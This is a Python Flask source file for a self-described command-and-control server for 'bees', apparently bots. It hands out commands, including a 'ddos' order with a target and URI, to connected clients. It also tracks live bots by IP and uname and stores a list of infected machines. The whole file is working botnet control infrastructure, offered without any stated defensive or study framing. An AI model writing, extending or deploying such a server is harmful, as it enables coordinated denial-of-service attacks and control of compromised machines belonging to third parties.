import json, time
from flask import Flask, request, jsonify
from threading import Thread

app = Flask(__name__)

@app.route("/")
def hello():
    return "Simple C&C server to control bees"

@app.route("/command", methods=['GET','POST'])
def commands():
    global command
    if request.method == 'POST':
        data = request.data.decode('utf-8')
        jdata = json.loads(data)
        cmd = jdata['command']
        command['command'] = cmd
        if cmd.endswith('ddos'):
            command['target'] = jdata['target']
            command['uri'] = jdata['uri']
    return jsonify(command)

@app.route("/status", methods=['GET','POST'])
def status():
    global log
    if request.method == 'POST':
        bee_ips = [bee['ip'] for bee in log['sensors']]
        data = request.data.decode('utf-8')
        bee_ip = json.loads(data)['ip']
        bee_uname = json.loads(data)['uname']
        if bee_ip not in bee_ips:
            log['sensors'].append({'ip': bee_ip, 'uname': bee_uname, 'last_seen': time.time()})
        else:
            for bee in log['sensors']:
                if bee['ip'] == bee_ip:
                    bee['last_seen'] = time.time()
    return jsonify(log)

@app.route("/infected", methods=['GET','POST'])
def infected():
    global inected
    if request.method == 'POST':
        data = request.data.decode('utf-8')
        sensors = json.loads(data)['sensors']
        infected['sensors'] = sensors
    return jsonify(infected)


def roll_logs():
    global log
    while True:
        updated_log = {'sensors': []}
        for sensor in log['sensors']:
            if sensor['last_seen'] > time.time() - last_seen_thr + 0.5:
                updated_log['sensors'].append(sensor)
        log = updated_log
        time.sleep(1)

if __name__ == '__main__':
    command = {'command': 'status'}
    log = {'sensors': []}
    infected = {'sensors': []}
    last_seen_thr = 5
    roll_logs_thread = Thread(target=roll_logs)
    roll_logs_thread.setDaemon(True)
    roll_logs_thread.start()
    app.run(host='0.0.0.0',port=80)
